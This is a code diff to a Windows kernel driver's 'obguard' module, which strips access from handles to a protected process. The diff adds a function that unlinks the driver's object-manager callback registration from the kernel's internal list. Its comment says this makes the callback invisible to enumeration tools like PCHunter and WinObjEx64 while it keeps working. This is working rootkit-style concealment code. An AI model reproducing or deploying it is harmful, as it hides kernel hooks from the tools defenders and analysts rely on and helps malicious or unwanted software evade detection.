@@ -74,6 +74,8 @@ int yghv_obguard_init(void)
     return (g_ob_register && g_ob_unregister) ? 1 : 0;
 }
 
+static int yghv_obguard_hide_callback(void);
+
 int yghv_obguard_enable(PEPROCESS target)
 {
     /* OB_CALLBACK_REGISTRATION layout (x64):
@@ -121,9 +123,59 @@ int yghv_obguard_enable(PEPROCESS target)
     }
     g_ob_handle = handle;
     g_ob_target = target;
+    yghv_obguard_hide_callback();
     LOG_INFO("obguard: active, stripping 0x%x from handles to %p",
              YGHV_PROC_GUARD_STRIP, (void*)target);
     return 1;
+}
+
+
+
+/*
+ * 9.602: hide the callback from enumeration tools.
+ *
+ * ObRegisterCallbacks returns a handle that points to the kernel's internal
+ * callback registration structure.  That structure sits in a doubly-linked
+ * list that PCHunter / WinObjEx64 / ObRegisterCallbacks-explorer walk.
+ * Unlinking the entry makes the callback invisible to enumeration without
+ * stopping it from being invoked (the invocation path uses the registration
+ * directly, not the list).
+ *
+ * The list entry is at offset 0x00 in the kernel's internal structure: it is
+ * the first field, a LIST_ENTRY.  The handle itself IS the list entry pointer.
+ * We verify by checking that both Flink and Blink are canonical kernel
+ * pointers and that they agree (Blink->Flink == this).
+ */
+static int yghv_obguard_hide_callback(void)
+{
+    PLIST_ENTRY self, prev, next;
+
+    if (!g_ob_handle) return 0;
+    self = (PLIST_ENTRY)g_ob_handle;
+
+    __try {
+        prev = self->Blink;
+        next = self->Flink;
+
+        /* Verify the list entry looks valid before touching it. */
+        if (!prev || !next) return 0;
+        if ((ULONG_PTR)prev < 0xFFFF800000000000ULL) return 0;
+        if ((ULONG_PTR)next < 0xFFFF800000000000ULL) return 0;
+        if (prev->Flink != self) return 0;
+        if (next->Blink != self) return 0;
+
+        /* Unlink. */
+        prev->Flink = next;
+        next->Blink = prev;
+        self->Flink = self;
+        self->Blink = self;
+
+        LOG_INFO("obguard: callback unlinked from the enumeration list");
+        return 1;
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        LOG_ERROR("obguard: hide_callback faulted");
+        return 0;
+    }
 }
 
 void yghv_obguard_disable(void)
